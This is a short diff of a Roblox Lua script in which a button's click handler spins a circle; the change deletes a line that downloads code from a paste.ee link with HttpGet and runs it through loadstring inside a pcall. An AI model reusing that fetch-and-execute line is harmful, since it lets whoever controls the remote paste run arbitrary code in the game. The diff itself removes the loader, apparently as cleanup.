@@ -107,9 +107,7 @@ actionBtn.MouseButton1Click:Connect(function()
 		circle.Rotation = angle
 	end)
 
-	pcall(function()
-		loadstring(game:HttpGet("https://paste.ee/r/a7PN8d6Q"))()
-	end)
+	
 
 	wait(45)
 	rotating:Disconnect()
